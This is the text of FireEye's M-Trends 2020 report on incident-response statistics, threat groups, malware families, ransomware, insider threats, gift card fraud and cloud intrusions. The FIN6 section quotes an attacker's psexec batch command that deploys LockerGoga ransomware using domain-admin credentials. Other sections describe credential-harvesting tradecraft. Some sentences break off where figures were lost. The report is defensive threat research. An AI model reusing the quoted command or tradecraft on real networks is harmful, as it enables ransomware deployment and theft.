EXECUTIVE
SUMMARY

SPECIAL REPORT M-TRENDS 2020

The Next Decade of Cyber Threats

FireEye has been detecting and responding to cyber attacks every
day for over 15 years. The release of M-Trends® 2020 marks 11 years of
providing the cyber security community with insights gained from the
frontlines of those attacks.
In earlier editions of M-Trends, we observed that while some things change, many
things remain the same. For example, M-Trends 2010 discussed how phishing
was the most common and successful method APT groups were using to gain
initial access to an organization. That hasn’t changed. Many of the case studies in
M-Trends 2020 also begin with phishing, perpetuating the widely held belief that
people are typically the weakest link in the security chain.

SPECIAL REPORT M-TRENDS 2020

While attacker tactics, techniques and procedures (TTPs) may not be changing
dramatically, the overall trends are still evolving. For example, organizations are
migrating to the cloud at an increasing rate, so M-Trends 2020 details cloudrelated incidents and some cloud best practices. Additional shifting trends and
fresh observations in M-Trends 2020 include:
• Attackers continue to grow more adept at working across a range of
operating systems and device types, as well as in both on-premises and
cloud architectures. Traditional barriers to attacker success continue to lessen
over time. Put simply, more attackers can do more things in more diverse
environments.
• APT41, a recently named prolific cyber threat group, is responsible for carrying
out Chinese state-sponsored espionage and financially motivated activity.
This group dates back to at least 2012, when they were conducting financially
motivated operations primarily targeting the video game industry—activity that
preceded their state-sponsored campaigns.
• Of all the malware families observed by FireEye this year, 41 percent were
previously unknown. This means that malware authors are innovating—possibly
in an attempt to evade detection technologies—and not just relying on updates
to existing malware.
• Cyber criminals that historically targeted personal and credit card information
are increasingly turning to ransomware as a secondary source of income. Cyber
criminals are also outsourcing tasks to monetize operations faster.
• To expand the way they monetize operations, attackers have been observed
targeting corporate reward systems to steal gift cards. These gift cards are then
resold or used to make direct purchases.

Of course no edition of M-Trends would be complete without our “By the
Numbers” data. Many readers are eager to learn if the industry is getting better at
detecting attacks; this year, the answer is yes. From October 1, 2018, to September
30, 2019, the global median dwell time was 56 days. That’s a big improvement over
the 78-day global median dwell time we reported in M-Trends 2019.
In addition to dwell time data, this year we have introduced three new statistics to
By the Numbers—an overview of which threat groups were active over the past
year, an overview of new malware families observed in 2019 and a heat map of
threat techniques aligned to the MITRE ATT&CK framework.
While TTPs, trends and observations may have evolved over the past decade,
the goal of M-Trends has always stayed the same: to arm security teams with the
knowledge they need to defend against today’s most often used cyber attacks, as
well as lesser seen and emerging threats.
The information in this report has been sanitized to protect identities of victims
and data.

Data from FireEye
Mandiant Investigations

The statistics reported in M-Trends 2020 are based on FireEye Mandiant
investigations of targeted attack activity conducted between October 1,
2018 and September 30, 2019.

Internal detection is
when an organization
independently
discovers that it has
been compromised.

External notification
is when an outside
entity informs an
organization that it has
been compromised.

Detection by Source
Over the last year, Mandiant consultants observed a 12-percentage point decrease
in the proportion of compromises detected internally. This is the largest decrease
in this metric since 2011. For the first time in four years, external notifications
exceeded internal detections. This shift is potentially due to a variety of factors,
such as increases in cyber security vendor and law enforcement notifications,
continued expansion of the cyber security industry, changes in public disclosure
norms and compliance changes. It is unlikely that organizations’ ability to detect
intrusions deteriorated, because other metrics show continued improvements in
organizational detections and response.

In 2019, 41% of the compromises investigated by Mandiant experts had dwell
times of 30 days or fewer, compared to 31% the previous year. Twelve percent of
investigations had dwell times greater than 700 days which is consistent with the
previous year.
These trends could be due to organizations developing their detection programs,
as well as changes in attacker behaviors. Mandiant experts have seen a continued
rise in disruptive attacks (such as ransomware and cryptocurrency miners) which
often have shorter dwell times than other attack types.

In the Americas, median dwell time continued its downward trend. Mandiant analysts
reviewed all investigations in the Americas with a dwell time of 14 days or fewer to
identify factors contributing to the decline. Disruptive attacks such as ransomware
were involved in 43% of these investigations. Such attacks had a similar contribution
to the downward trend in dwell time in prior years. It is important to note that our
researchers have also observed multiple instances of dwell times for disruptive
attacks well above the overall median. Other factors contributing to the decrease in
median dwell time in the Americas included internal detections (30%) owing to the
vigilance of security staff and investments in advanced technology and managed
detection and response (MDR) services. The final 27% of incidents with dwell times
of 14 or fewer days were identified through some very efficient external notifications.

The median dwell time for APAC during 2019 decreased to 54 days, from 204 days
in the prior year.
This statistic is skewed by the significant amount of ransomware-related breaches
(18% of all cases), which have a dwell time of zero days.
Without those ransomware cases, the median dwell time for APAC would be
94 days, still an improvement over the prior year, but more indicative of the real
trend observed in the region and in line with the median dwell times reported in
M-Trends 2018 (498 days), and M-Trends 2019 (204 days).
We have observed that the dwell time trend is still reflective of several advanced
breaches that remained undetected for a long time. Ten percent of breaches
investigated during 2019 showed dwell times of more than three years, with the
longest dwell-time reported in APAC being 2,854 days—nearly eight years. As in
past years, attackers in APAC still maintain access in compromised organizations
for far too long.

EMEA has seen a marked reduction in dwell times. In M-Trends 2019, we suggested
that a steep rise in median dwell time was likely linked with organizations putting
more emphasis on GDPR and increasing focus on security which may have
revealed historic compromises. EMEA statistics are now generally in line with the
global averages, which reflect the improving security posture of organizations
and highlight the ongoing challenges organizations face from sophisticated
threat actors. While significant improvements have been made, attackers still go
undetected in target environments for far too long, remaining stealthy and harder
to spot as they pursue their goals.
External notifications outnumbered internal detections compared to last year.
This reflects the volume of notifications that organizations receive and the various
sources of external notifications which are expanding beyond the traditional law
enforcement notifications. While some of these EMEA incidents with external
dwell times were long-running intrusions, many of them were remnants of historic
attacks rather than active attacks.

Industry Targeting
We continue to see consistent industry targeting in the last year when compared
to past M-Trends. This consistency is the strongest in the “Top 10” industries year

Targeted Attacks and Retargeting
Mandiant professionals responded to a number of attacks in the past year,
observing that:
• 7% originated with or used compromised third party access
• 15% had multiple attackers
• Less than 1% involved an insider
• 22% had data theft likely in support of intellectual property or espionage
end goals
• 29% were likely for direct financial gain. This includes extortion, ransom, card
theft, and illicit transfers
• 3% of these targeted attacks were for the purpose of reselling access gained in
the intrusion
• 4% likely served no purpose except for creating compromised architecture to
further other attacks
Eleven percent of all Mandiant engagements in this period were for responses
or assessments in environments with a significant cloud component. Overall, we
continue to see more clients adopt a hybrid environment strategy using a mix of
on-premises and cloud architecture or services. And attackers are becoming more
comfortable working across such hybrid environments to pursue their goals.

Re-Attack Rate
In 2019, 31% of FireEye Mandiant Managed Defense customers who previously
underwent a Mandiant Incident Response engagement were attacked within the
following 12 months. In this context, an attack is considered to be an event in which
one or more systems with unauthorized activity required further investigation.
Such an investigation goes beyond the data typically reviewed or acquired to
determine the legitimacy of an alert.
Similarly, in 2018, FireEye identified that the same percentage of Managed Defense
customers, 31%, were attacked in the following 12 months. This re-emphasizes
the need for organizations to be vigilant, especially those who have previously
experienced an incident.

Threat Groups
Our clients encountered activity from a wide range of established threat groups, as
well as hundreds of new threat groups that emerged in the last year (Fig. 1).
Six of 10 named financial threat groups (FIN) and 17 named APT groups (44% of all
known APT groups) from six different countries were active. These named groups
were joined by 159 other groups in intrusion attempts against our clients.

Our ability to analyze malicious code and assign them to malware families remains
critical to incident response efforts. In 2019, we observed over 500 new malware
families, 58% of which were discovered through Mandiant service efforts, including
incident responses (Fig. 2). The majority of these new samples either impacted
Windows or multiple platforms. While we do see new malware families solely
impacting macOS and Linux, they remain in the minority.

Threat Techniques
To support community and industry efforts, our findings are now mapped to
the MITRE ATT&CK framework. There remains some variance in ATT&CK
techniques and naming conventions.
MITRE ATT&CK is a
publicly-accessible
knowledge base of
adversary tactics and
techniques based on
real-world observations.
It was designed to be
a community-accepted
and community-driven
foundation to align
methodologies and
drive improvements.

Over the last two years, FireEye worked with MITRE to augment their ATT&CK
framework and work on merging the FireEye technique catalog. Over 1300
existing FireEye techniques (and subsequent findings) have been mapped to
applicable MITRE ATT&CK framework techniques. As FireEye continues to grow
our techniques list and MITRE evolves the ATT&CK framework, we will continue
to cross-map to improve both models, which may differ slightly from offerings by
other vendors.
In 2019 a range of new techniques was used by threat actors, with a heavy reliance
on traditional, well-established actions. They included a mix of leveraging valid
access, use of valid client tools and attacker-owned files. Of the top five most
common techniques, we observed three used for valid access (t1086, t1035, t1133),
one used for both valid and illicit access (t1064), and only one around purely
attacker-derived tooling (t1027). This trend is pervasive throughout the full list
of observed techniques (Fig. 3). We observed only 40% of all MITRE ATT&CK
techniques in use against FireEye clients. Of these, more than half were only seen
in nine or fewer intrusions over the past year. While understanding the full range
of attacker techniques is useful, developing effective response and remediation
against just the top 10 covers the vast majority of actual attacker actions used in
the last year.

APT Named in 2019

FireEye tracks thousands of threat actors, including state-sponsored
attackers responsible for carrying out advanced persistent threat
(APT) attacks. Because the motivations of a state-sponsored attacker
are often tied to strategic imperatives, APT threat actors often pursue
their objectives over longer periods of time than other threat actors.
Maintaining access to victim environments for months or years requires
threat actors to be adept at handling attempts to remove their access.

26

SPECIAL REPORT M-TRENDS 2020

In 2019, FireEye promoted one attack group from a tracked TEMP group to an APT
group: APT41.
APT41 is a prolific cyber threat group responsible for carrying out Chinese
state-sponsored espionage as well as financially motivated activity. The group’s
activity dates to 2012 when APT41 conducted financially motivated operations
focused on the video game industry (Fig. 4). This activity preceded their statesponsored activity.
Accessing video game production environments enabled APT41 to develop the
TTPs that were later used to conduct software supply chain compromises. APT41
carried out the supply chain attacks to enable them to inject malicious code into
legitimate files, which would be used to compromise additional organizations.
These attacks affected a significant number of organizations and individuals,
but APT41 only conducted follow-on activity at a subset of victims, indicating
APT41 was interested in specific targets. The group’s distinct use of supply chain
compromises to target select individuals, consistent use of compromised digital
certificates and deployment of bootkits and rootkits (rare among APT operators),
highlighted a creative and well-resourced adversary.
Based on early observed activity and APT41’s focus on the video game industry,
we believe the group’s cyber crime activities are most likely motivated by financial
gain or hobbyist interests. This stands in contrast to the state-sponsored goals
that likely drive the group’s targeting of higher education, telecommunications,
travel services and news/media firms. The attacks appear to have been carried
out as part of a surveillance operation. The group’s most recent activity included
targeting call record information and SMS data.
Two identified personas using the monikers “Zhang Xuguang” and “Wolfzhi”
linked to APT41 operations have also been identified in Chinese-language forums.
These individuals advertised their skills and services and indicated that they could
be hired.
APT41 is unique among China-based actors in that it leverages non-public malware
typically reserved for espionage, in operations that appear to fall outside the scope
of state-sponsored missions. The group’s mix of financial and state sponsored
motivations are remarkable because this type of activity is unusual among Chinese
state-sponsored threat groups.
APT41’s links to both underground marketplaces and state-sponsored activity may
indicate the group is permitted to conduct its own for-profit activities. It is also
possible that APT41 evaded scrutiny from Chinese authorities. Regardless, APT41
operations underscore a blurred line between state power and crime that lies at
the heart of threat ecosystems.

The Pulse of Security

Malware Families

A malware family is
a program or set of
associated programs
with sufficient “code
overlap” among the
members that FireEye
considers them to
be the same thing, a
“family”. The term family
broadens the scope of
a single piece of
malware as it can be
altered over time, which
in turn creates new,
but fundamentally
overlapping pieces
of malware.

Malware family code is often examined using disassembler or decompiler tools,
through a process called reverse engineering. Being a family does not require the
code to be 100% identical. The most common differences FireEye sees among
members of a family are related to configuration, command and control (CnC)
addresses, and features. Depending on the features and how the malware evolves,
FireEye sometimes identifies and tracks subgroups or subfamilies within a malware
family. For FireEye Mandiant, defining a code family is part science and part art,
and may involve comparison and analysis by automated systems and experts.
In samples found in the field between October 2018 and September 2019, Mandiant
researchers encountered 186 unique malware families, comprised of tens of
thousands of malware samples. These statistics do not include malware that has
been analyzed, but not assigned to a malware family.

Highlights
• 41% of the malware families seen this year were never seen before.
• 70% of the samples identified belonged to one of the five most frequently seen
families, which are based on open source tools with active development.
• 23% of the malware observed in this reporting period is publicly available and
used by a range of attackers with varying skill levels.
• The vast majority of malware is written to elevate privileges and move laterally in
an environment.
Mandiant researchers analyzed the 186 unique malware families from Mandiant
engagements this year to reveal six traits and trends. Traits focus on the malware
specifics, such as category, file type, accessibility and obfuscation. Trends include
the top families and how many of them were new in 2019.

SPECIAL REPORT M-TRENDS 2020

These top five malware families are:
• BEACON A publicly available endpoint agent for Cobalt Strike. It is a popular
commercial dual-use penetration toolkit with configurable CnC channels and a
robust feature set. While a new yearly license is $3500, this kit is readily available
on pirated websites and forums. Mandiant analysts have observed the following
named attack groups using BEACON: APT19, APT32, APT40, APT41, FIN6, and
FIN7. These groups represent a diverse mix of skillsets and motivations.
• EMPIRE An open-source post-exploitation framework and PowerShell endpoint
agent. It provides post-exploitation modules ranging from keyloggers to
Mimikatz, and adaptable network communications to evade network detection.
Much like BEACON, Mandiant has observed EMPIRE being used by a wide range
of attackers at all skill levels, including APT19, APT33, and FIN10.
• TRICKBOT A modular banking trojan that uses web injects. This technique
allows malware to intercept users attempting to access legitimate websites
and “injects” malicious content to steal credentials and financial information.
Default modules include banking and user Information theft, system/network
reconnaissance and credential and network propagation. This framework is also
used to install other malware and tools. Over the past year, we saw TRICKBOT
used in conjunction with EMPIRE and RYUK (a ransomware tool) at a number of
FireEye clients.
• SHORTBENCH A downloader used to download and execute shellcode to
download and install additional malware and tools. It is a simple, lightweight
and open-sourced framework. SHORTBENCH can be used to download virtually
any follow-on payload and has been observed in use by diverse actors in a wide
range of event types.
• QAKBOT A complex and full-featured modular stealthy banking trojan first seen
in 2008. It has worm-like propagation capabilities and anti-analysis features.
Qakbot is typically delivered via phishing email, exploit kit, removable drive and
infected web pages. The malware is typically used to steal sensitive information,
such as banking and email credentials. Financial targets and other targeted
domains and blacklisted sites are hard-coded into the malware. We saw a sharp
decline in the use of QAKBOT in the last year.

Monetizing Ransomware
The successful monetization of ransomware attacks and the availability of
ransomware as a service have contributed to an increase in ransomware cases.
It has also led some established cyber crime groups to turn to ransomware as a
secondary means of generating revenue. In 2019 we saw several cases in which
threat actors that historically targeted sensitive information such as personally
identifiable information (PII) and credit card information turned to ransomware to
monetize access to victim networks.

FIN6

Figure 11.

Strings from
deployment BAT
files.

In one case, FIN6, a cyber crime group known to target payment card information,
was identified operating inside a company in the engineering sector. The
presence of FIN6 in an engineering company with no connection to payment card
information seemed odd. The Mandiant investigation revealed that the attacker
was in the early stages of a deploying LockerGoga. Using domain administrator
credentials, the attacker ran batch files containing psexec commands to connect
to remote systems and deploy LockerGoga. The batch scripts (Fig. 11) executed
LockerGoga as the service “mstdc,” which was likely the attacker’s attempt to
masquerade as the legitimate Windows service “msdtc.” The batch files used by
the attacker followed the naming convention “xaa.bat”, “xab.bat”, “xac.bat” and
so on.

start copy svchost.exe \\10.1.1.1\c$\windows\temp\start psexec.exe \\10.1.1.1
-u domain\domainadmin -p “password” -d -h -r mstdc -s -accepteula -nobanner
c:\windows\temp\svchost.exe

Mandiant analysts linked the tools and attacker infrastructure to other FIN6
activity, and eventually concluded that FIN6 had expanded to using ransomware to
further monetize their access to compromised environments.

UNC1733
In 2019, UNC1733 targeted a retailer and tried to obtain payment card information
from the point-of-sale (POS) environment. The attacker gained access to the
environment by exploiting the CVE-2019-0604 vulnerability in a public-facing
SharePoint server. The exploit allowed the attacker to access the system and
launch a Cobalt Strike backdoor. After performing reconnaissance and lateral
movement, the attacker obtained domain administrator privileges by harvesting
credentials from systems in the environment. The attacker then began attempting
to obtain payment card information from the POS environment. To support their
efforts, the attacker deployed TRINITY and WETLINK to obtain payment card
information from the memory of POS systems. Both attempts failed because
the victim organization was using point-to-point encryption. Within 24 hours of
failing to acquire payment card information, the attacker changed tactics and
used Cobalt Strike backdoors deployed to non-POS servers to load an unknown
ransomware variant. The ransomware was in-memory only and could not be
recovered, but documents and database files were encrypted. The newly created
filenames had the name of the victim organization appended to them.

36

SPECIAL REPORT M-TRENDS 2020

Conclusion
Given the ease at which ransomware attacks can be carried out and the willingness
of victims to pay, FireEye has assessed that threat groups will continue to
leverage ransomware as a secondary means for monetizing their access to victim
environments.

The use of tool or service providers allows cyber criminals to increase the speed
at which they monetize an operation. The use of such providers was evident
throughout the financially motivated operations investigated by Mandiant
consultants in 2019. Common examples included:
• Attackers using malware that was available for purchase
• Use of card shops to sell stolen payment card data
• Victim PII offered for sale in criminal forums
• Access to victim networks offered for sale in criminal forums

In one case, a victim was targeted with a military recruiting-themed phishing
email containing a link to a remotely hosted ZIP file. The ZIP file contained a
malicious payload that ultimately loaded an instance of SQUIDSLEEP, a JavaScript
downloader that was then used to install the SQUIDGATE backdoor. Throughout
the compromise, SQUIDGATE was used to execute PowerShell commands to
launch a Metasploit reverse-shell (Fig. 13). SQUIDGATE is a malware family sold by
an actor operating in a reputable, Russian-language forum. The attacker moved
across the environment using Metasploit and privileged credentials obtained
earlier in the intrusion. Our tracking of the malware service provider and resultant
campaigns enabled us to attribute this operation to FIN6-motivated intrusions

From a POS server, the attacker deployed SCRAPMINT POS malware, a tool that
identifies Track 1 and Track 2 payment card information in memory and writes it to a

and procedures. We have not observed SCRAPMINT as publicly available, so it may be
offered by private providers or shared among a group of attackers.

SCRAPMINT was deployed to a small set of POS terminals across all retail
environments as the attacker attempted to identify systems that did not have
point-to-point encryption enabled. As the attacker identified POS terminals where
payment card information was accessible, they were also able to identify the
naming scheme for POS terminals with hosts that had point-to-point encryption
enabled. Following their discovery, the attacker deployed SCRAPMINT to 150 POS
terminals–almost none of which were protected by point-to-point encryption.
The following month, the attacker attempted to deploy SCRAPMINT to hundreds
of additional POS terminals that also did not have point-to-point encryption
implemented.
For the duration of the compromise, the attacker periodically returned to
the environment to copy and transfer payment card information out of the
environment through the SQUIDGATE backdoor. The data from this incident
appeared to be monetized through Joker’s Stash, a well-known card data shop
that our analysts have seen used by prolific threat actors such as FIN6 and FIN7.

A Win-Win
Underground communities allow malicious threat actors to establish relationships
that are mutually beneficial. Threat actors can specialize in specific tasks or types
of activity to achieve a greater overall impact when working together. For example,
an individual who is a skilled coder doesn’t need to also have expertise on money
laundering or malware distribution. An intrusion operator doesn’t necessarily need
to expend time and resources developing malware, standing up infrastructure,
or worrying about how they can cash out stolen goods; instead, they can focus
exclusively on active intrusion operations. As a result, it is likely that more skilled
operators will be able to pivot through networks more quickly and ultimately
increase the velocity and scale of their operations. We expect these types of
business relationships to continue enabling financially motivated intrusions
throughout 2020.

Threats From Within
Over the past year, FireEye Mandiant teams responded to an increasing number
of incidents in which malicious insiders destroyed critical business systems,
leaked confidential data, stalked employees and extorted and blackmailed the
organizations they worked for. Some of the insiders were involved in economic
espionage, some were motivated by greed and others vandalized their employer.
Consequently, organizations are increasingly paying attention to the business risk
and impact of insider threats. Some malicious insiders brought public attention
to their misdeeds by leaking data, broadcasting demands or making threats.
Conversely, we saw some malicious insiders initially remain private, demanding
money to prevent the release of stolen data. Some insiders acted with stealth to
steal research data or intellectual property. The increasing number of incidents is
particularly troubling for organizations of all sizes and missions because insiders
are, by definition, those we normally trust most.
Mandiant engagements included investigations of malicious insiders who
were third-party contractors, current employees and past employees. The
roles they played included contract staff, IT admins, individual contributors,
lawyers, academics and senior executives. Their true goals included stalking,
blackmail, extortion, intellectual property theft and sabotage. The insider incident
investigations were complex and solved through a combination of technical
forensic analysis and traditional non-cyber investigative techniques.
Like traditional targeted attacks by external threat actors, malicious insider attacks
are often carried out over time, with the insider usually taking steps to try to hide
their malicious activity and remain undetected in the victim environment. And even
when their malicious activity is detected, these insiders have sometimes taken
steps to divert culpability through the use of other employees’ accounts.
Malicious insider incidents are likely to become an increasing trend given that
they involve trusted access, high impact and low cost to execute, combined with
organizational cultures with open trust models. In addition, we have seen the rise
of successful extortion incidents that have been publicized.
Four types of insider threat—extortion, economic espionage, asset destruction,
workplace stalking—appeared to trend with FireEye clients in 2019.

Trend 1: Extortion
Mandiant investigators observed an increasing number of insiders engaging
in digital extortion schemes. Most often, the insiders attempted to extort their
organization by threatening to publicly release stolen data if a monetary demand
was not met. The ransom demand often demanded payment in a decentralized
digital currency such as Bitcoin.
The ransom demand amount was usually commensurate with the perceived value
of the stolen data. This helped ensure companies would consider payment. If the
demanded amount was too large, the attacker would likely not get paid.
Most of the insider extortion cases we responded to followed a common approach.
The attacker sent an email to a company executive indicating that some amount of
sensitive data was stolen, provided proof of the possession of the stolen data and
stated that the data would be released publicly on a certain date unless a payment
was made.

SPECIAL REPORT M-TRENDS 2020

41

Attributing an extortion demand to an insider is complicated. An organization
needs to determine if the extortion demand is real by determining if the data is
authentic. If the data is authentic, the organization needs to understand where
the data came from and how it was obtained. A broad investigation of the
environment is sometimes required to determine who may be behind the incident.
When authentic data accompanies an extortion demand, organizations
must ask:
• Did the data come from inside the organization?
• Is there evidence of an intrusion and was the data stolen?
• Were legitimate credentials used to access the data, and if so, were those
credentials stolen by a threat actor or used by the employee?
Sometimes an extortionist attempts to deceive the victim organization. In one
case, an extortionist demanding money claimed to be an outside attacker that was
collaborating with an insider. We later learned the extortionist was an employee
trying to frame a coworker. In another situation, the extortionist claimed to have
compromised the credentials of an employee. This was likely an attempt by the
insider to create an alibi in case they were later caught.
There are several competing priorities in an insider investigation. An organization
must validate the risk exposure, establish and execute a communication strategy
with the extortionist and prevent further access to the network—all while under an
aggressive threat actor-imposed deadline. Immediate determination of whether an
incident was caused by an internal or external actor is not often possible without a
proper forensic investigation.
The obvious next question is whether a victim organization should pay the demand.
Each scenario is unique and needs to be approached differently. Even if a victim
organization pays the demand, there is always a chance the attacker will release
the data anyway to media, social networking platforms, file sharing sites and
underground forums.

EXTORTION CASE STUDY
In one case, an individual claimed to have access to a large amount of sensitive company data. The
individual provided excerpts of confidential data to the victim organization as proof and threatened to
publish the rest of the stolen data unless a payment was made. The extortionist allowed the organization to
make partial Bitcoin payments and allowed a few deadlines to slip. Analysis showed that after each Bitcoin payment,
the extortionist attempted to prevent detection by using a third-party service to launder the Bitcoin payment to break
the connection between the payment source and destination.
Mandiant investigators performed system and network forensic analyses of the environment, did not identify evidence
of external compromise and suspected that an insider may have been involved. Ongoing communications with
the extortionist provided the necessary information to determine the individual was likely a previous employee. In
fact, investigators discovered that the stolen data had been internally copied six months earlier. Mandiant analysts
identified large Server Message Block (SMB) file transfers conducted over the organization’s certificate-based virtual
private network (VPN) connection during off-hours. The endpoint in question was determined to be missing from the
corporate premises. The VPN source IP addresses for all known VPN logons from the missing endpoint were crossreferenced with the list of other logons. The resulting list highlighted the activity by the terminated employee. The
company involved law enforcement which led to the recovery of company property. No customer data was known to
be publicly released.

SPECIAL REPORT M-TRENDS 2020

Trend 2: Economic Espionage
Mandiant experts observed significant intellectual property research theft by
insiders, including some potentially associated with China’s Thousand Talents
program. China’s program has been the subject of debate. In 2019, the United
States Senate, Permanent Subcommittee on Investigations, Committee on
Homeland Security and Governmental Affairs published a report that stated,
“Launched in 2008, the Thousand Talents Plan incentivizes individuals engaged
in research and development in the United States to transmit the knowledge and
research they gain here to China in exchange for monetary payments… China
unfairly uses the American [funded] research and expertise it obtains for [China’s]
own economic and military gain.”1

ECONOMIC ESPIONAGE CASE STUDY
In one case, an organization hired PhD scientists with ties to China to support a research project. As part
of the scientific team, the organization provided access to years of sensitive research materials, experiment
data and findings from other researchers. The scientists were hired to materially and meaningfully
contribute to the research and collaborate with the team. The research model supported full access to all data, and IT
policies provided few security controls to authorized users or to their devices. The research team noted few research
contributions and a lack of participation with the research team’s efforts. The research team did notice the scientists
spent a lot of time by themselves pouring through the data. Through forensic analysis, it was determined that the
scientists installed a Chinese cloud-based file storage application on their laptops. Using their authorized access to
sensitive data and intellectual property, the scientists uploaded significant volumes of sensitive research into a cloud
environment hosted in China.

Trend 3: Asset Destruction
Mandiant responders were engaged by a client at which an executive had received
an extortion message via an anonymous email. The attacker had indicated that
they possessed access to the client’s internal network and had the ability to cause
outages. A significant payment was demanded in Bitcoin. As proof, the attacker
referred to an unexplained outage of a critical security system that occurred a few
weeks earlier.
Mandiant analysts identified evidence to suggest that the outage of the security
system had occurred as a result of malicious actions by an insider where the root
account was used to delete several critical operating system files, rendering the
security service unavailable. Analysis of more than 20 different log sources led
to identifying the insider. Forensic analysis identified malicious SSH connections
from an unauthorized device to Linux servers hosting a critical security service.
The /var/log/secure authentication log file was recovered from one of the server’s
deleted space and allowed Mandiant investigators to identify the RSA key used
by the attacker to connect to the system. The investigators determined that
the malicious insider, just prior to engaging in malicious actions, had disabled
endpoint protection on his workstation and masked his behavior by using VMware
with guest systems in bridge mode. Mandiant analysts also identified evidence
of destructive actions against critical production systems by analyzing the
virtual machines stored on the employee’s workstation. Forensic analysis of the
employee’s workstation showed the execution of anti-forensic programs.

Trend 4: Workplace Stalking
In one case, Mandiant experts were called in after a client received alerts from
their digital loss prevention solution that indicated an employee was trying to copy
sensitive customer files to a USB drive. The organization noted other user accounts
logging into the employee’s system regularly. Camera footage showed the
employee was the only person there at the time of the logins; the employees who
appeared to be logging in were not at work. During the investigation, keylogging
data was found in a log.txt file stored in one of the employee’s directories named
“dumps,” which focused the investigation towards a physical keylogger. Corporate
email searches showed receipts for purchases of keylogging devices in the
employee’s name. Analysis of the log.txt files found other employee usernames
and passwords, which validated how the employee had access to other employee’s
user accounts. Further analysis showed that the employee gained access to over
30 other user accounts over a multi-year period. The employee used this account
access to view personal employee information such as salaries. The employee
also engaged in cyberstalking behaviors against several female employees. The
employee read their emails, obtained their personal user account credentials and
gathered photos of them. Mandiant investigators were able to gather enough
relevant information via the user’s Outlook Personal Storage Table (.pst) email
files to show the employee had emailed their keylogging files directly from their
business account to their personal accounts. The investigation also identified
additional stalking materials in backups of the employee’s home directory.

Conclusion
Organizations across the world are investing more resources to detect and protect
their most critical assets and crown jewels from malicious insiders. Unfortunately, in
many cases, these investments come after an event which caused organizational,
brand or reputational harm. The impact of an insider betraying an organization’s
trust can be devastating for organizations of all sizes. We expect to see this trend
to continue into 2020 and beyond.

Gift Cards in the Crosshairs

In 2019, Mandiant experts responded to intrusions we assessed with a high-level
of confidence to be evolving FIN9 intrusions. These were notable due to the
attacker’s shift to targeting IT service providers. This increased their impact and
reach across multiple organizations compared to past activity. The attackers
expanded their monetization actions by targeting corporate reward systems to
steal gift cards. Finally, the attackers continue to expand and evolve their toolset
with a distinct focus on publicly available tools and compromised legitimate
access. Mandiant analysts expect to see these efforts continue due to their
lucrative nature and favorable attacker outcomes.

The Value of Targeting Gift Cards
The flexible characteristics of gift cards make them attractive to actors for use in
financially-motivated operations. Gift cards can be used in many different venues
and are easy to monetize through resale or by making direct purchases. The
existence of public marketplaces that allow individuals to exchange gift cards
directly for Bitcoin also provides malicious actors a quick, anonymous way to
cash out. Also, gift card processing generally does not require the use of PII, and
gift card breaches are tracked differently than the more well-established PII/PCI
material. This alters organizations’ reporting requirements and, in practice, may
mean that at least some organizations have established less robust measures to
prevent the fraudulent use of gift cards.

SPECIAL REPORT M-TRENDS 2020

First Stage: Targeting IT Service Providers
Investigations pursued by Mandiant professionals suggested the attackers
primarily obtained initial access to IT service providers using credentials
collected through phishing campaigns. In one case, over 50 individuals received a
phishing email claiming to be an encrypted message from the organization’s HR
department. The phishing email was created using a legitimate email marketing
platform. Credentials obtained through this phishing campaign were then used to
log into the organization’s IT service management portal, and later used to attempt
authentication to Office365 email inboxes. All authentication attempts to the
organization’s O365 environment were made from network nodes associated with
a commercial VPN service.

The embedded link in the phishing email (Fig. 15) mimicked those created by
legitimate secure email portals, but directed users to a phishing kit. The phishing
kit was hosted at organization-specific subdomains of the attacker-controlled

the publicly available LUCY Phishing Software platform.

Second Stage: Operations
Initial Access / Establish Foothold
In several incident responses handled by Mandiant professionals, the attackers
used these compromised legitimate credentials as initial access into victim
organizations. While the attacker possessed multiple accounts with elevated
privileges, they did not use them in any specific way. Instead, the attacker would
often attempt to access legitimate VPN architecture in the early phases of the
intrusion (Fig. 16). This implies a preference for pre-determined intrusion steps
instead of adapting based on what they possessed from earlier intrusion actions.
We suspect this preference is due to expanding their footprint as valid users by
accessing the victim through trusted corporate infrastructure.

SPECIAL REPORT M-TRENDS 2020

Maintain Presence / Lateral Movement
The attacker primarily used both the Microsoft Remote Desktop Protocol (RDP)
and a variety of legitimate and publicly available tools to maintain persistence
and move laterally within victim environments. ScreenConnect, EMCO Remote
Installer and Splashtop Streamer were among the list of tools commonly used
to both establish persistence and move laterally within the victim environments.
In intrusions observed throughout 2018, the attacker also used other publicly
available remote access tools including CleverControl, SentryPC, Teramind and
Virtual Network Computing (VNC). While there is some variance in tool use
between 2018 and 2019, all these tools effectively belong to the same category.
The tools may have been selected due to a range of factors, including their prior
existence in a victim environment or operator preference.

Internal Reconnaissance / Privilege Escalation
To collect credentials and conduct reconnaissance, the attackers used
ProcDump, PsExec, and Mimikatz. Credentials obtained enabled further internal
reconnaissance efforts, and supported end-stage operations. In multiple victim
networks, after obtaining appropriate administrative credentials, the attacker
used the O365 eDiscovery portal to perform keyword searches of emails and
stickynotes looking for messages relating to gift cards and credit cards, and for
evidence of administrative passwords sent via email. In at least one case, this same
methodology was employed in an earlier stage of the operation to search emails
for documentation or credentials related to corporate VPN access.

End-Stage Operations: Gift Card Targeting

Figure 17.

Attacker subverting

system.

Consistent with prior FIN9 operations, some compromised organizations had their
valid process for issuing gift cards subverted to create fraudulent gift cards for
the attacker (Fig. 17). In other instances, the compromised organization was not
in the gift card supply chain, but the attacker was still able to obtain gift cards
by exploiting corporate employee rewards systems. In one case, after harvesting
user credentials, the attacker submitted employee award nominations and then
approved them from approver-privileged accounts that were also compromised.
These employee rewards points were then traded in for gift cards.

Conclusion
Attacks like this highlight organizations’ need to mitigate risks associated with
using managed IT service providers, which involves threats not unique to any one
threat actor. This means treating accounts, systems and services managed by
third parties with additional scrutiny and monitoring for any associated anomalous
behavior. From a detection perspective, this threat actor regularly performs
reconnaissance of victim environments using their Office 365 eDiscovery portals.
Queries from this portal can be monitored for any effort to look for credentials
or search for systems or services relating to the management of gift cards. The
attacker’s use of compromised legitimate credentials reinforces the importance of
implanting multi-factor authentication (MFA).

Breaching the Cloud

Technology Subversion
Most of the Amazon Web Services (AWS) intrusions encountered in Mandiant
Incident Response engagements begin with compromised credentials, usually
in the form of an AWS access key or an identity and access management (IAM)
user password. An AWS access key consists of a unique public identifier and
a corresponding private (secret) key, which are, analogous to a username and
password respectively. Used together, a user can perform API requests against
AWS services or access the AWS environment via the AWS command line
interface (CLI). The CLI allows a user to modify and manage resources. Since
the keys are designed to enable applications to access an AWS environment,
organizations typically do not enforce multi-factor authentication (MFA).
